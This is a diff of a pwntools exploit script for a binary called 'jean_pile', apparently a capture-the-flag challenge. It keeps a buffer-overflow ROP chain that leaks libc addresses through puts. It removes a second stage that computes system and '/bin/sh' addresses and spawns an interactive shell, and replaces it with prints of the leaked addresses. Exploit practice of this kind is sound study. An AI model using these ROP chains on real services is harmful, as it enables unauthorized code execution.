@@ -2,14 +2,12 @@ from pwn import *
 
 context.binary = binary = ELF("./jean_pile")
 
-offset = 40+8
+offset = 48
 pop_rdi_ret = 0x400b83
-ret = 0x400b12
 puts_plt = binary.plt.puts
 puts_got = binary.got.puts
 setvbuf_got = binary.got.setvbuf
 fgets_got = binary.got.fgets
-service = binary.sym["service"]
 
 payload = b"".join([
         b"A"*offset,
@@ -23,7 +21,6 @@ payload = b"".join([
         p64(pop_rdi_ret),
         p64(fgets_got),
         p64(puts_plt),
-        p64(service),
         b"\n",
 ])
 
@@ -43,20 +40,6 @@ setvbuf_leak = u64(setvbuf_leak.ljust(8, b"\x00"))
 fgets_leak = output.split(b"\n")[2]
 fgets_leak = u64(fgets_leak.ljust(8, b"\x00"))
 
-system = puts_leak - 0x77980 + 0x4c490
-shell = puts_leak - 0x77980 + 0x196031
-
-payload = b"".join([
-        b"A"*offset,
-        b"SAVEDRBP",
-        p64(ret),
-        p64(pop_rdi_ret),
-        p64(shell),
-        p64(system),
-        b"\n",
-])
-
-p.send(b"1\n")
-p.recv()
-p.send(payload)
-p.interactive()
+print("puts :", hex(puts_leak))
+print("setvbuf :", hex(setvbuf_leak))
+print("fgets :", hex(fgets_leak))
